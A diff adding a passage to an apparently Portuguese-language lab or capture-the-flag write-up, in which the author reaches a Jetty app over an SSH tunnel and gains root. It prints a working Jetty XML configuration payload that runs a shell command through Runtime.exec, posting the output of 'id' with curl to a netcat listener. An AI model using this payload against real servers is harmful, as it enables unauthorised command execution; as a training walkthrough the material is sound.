@@ -166,3 +166,35 @@ ssh -L 3000:localhost:8080 betty@192.168.232.242
 
 Agora, basta acessar a porta 3000 no Kali, e você verá a aplicação Jetty.
 ![image](https://github.com/user-attachments/assets/02f91bf7-df28-4dc8-a21f-f03a537f5841)
+
+Voltei ao Google e comecei a pesquisar por explorações para o Jetty. Encontrei um artigo interessante que me levou a conseguir executar comandos como root.
+
+https://swarm.ptsecurity.com/jetty-features-for-hacking-web-apps/
+![image](https://github.com/user-attachments/assets/86b5309b-a3f9-479d-acc6-cdf7a2ef0c7e)
+
+
+```
+<?xml version="1.0"?>
+<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
+<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
+ <Call class="java.lang.Runtime" name="getRuntime">
+  <Call name="exec">
+   <Arg>
+    <Array type="String">
+     <Item>/bin/sh</Item>
+     <Item>-c</Item>
+     <Item>curl -F "r=`id`" http://127.0.0.1:1337</Item>
+    </Array>
+   </Arg>
+  </Call>
+ </Call>
+</Configure>
+```
+
+Dentro da máquina alvo :
+
+```
+nc -nlvp 1337
+```
+
+![image](https://github.com/user-attachments/assets/3a3417c6-1f08-486f-adbe-76370d34013f)
